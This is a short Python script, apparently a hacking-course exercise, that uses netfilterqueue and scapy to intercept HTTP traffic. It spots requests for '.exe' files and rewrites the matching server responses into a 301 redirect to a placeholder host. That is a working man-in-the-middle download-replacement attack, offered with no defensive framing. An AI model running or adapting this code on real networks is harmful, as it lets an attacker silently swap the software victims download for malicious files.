#!usr/bin/env python3

import netfilterqueue
import scapy.all as scapy

ackList = []

def setLoad(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def processPacket(packet):
    scapyPacket = scapy.IP(packet.get_payload())
    if scapyPacket.haslayer(scapy.Raw):
        if scapyPacket[scapy.TCP].dport == 80:
            if ".exe" in scapyPacket[scapy.Raw].load.decode():
                print("[+] exe Request")
                ackList.append(scapyPacket[scapy.TCP].ack)
        elif scapyPacket[scapy.TCP].sport == 80:
            if scapyPacket[scapy.TCP].seq in ackList:
                ackList.remove(scapyPacket[scapy.TCP].seq)
                print("[+] Replacing file")
                modifiedPacket = setLoad(scapyPacket, "HTTP/1.1 301 Moved Permanently\nLocation: https://example.com/\n\n")
                packet.set_payload(bytes(modifiedPacket))
                
    packet.accept()
    
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, processPacket) # 0 is [queueNum]
queue.run()
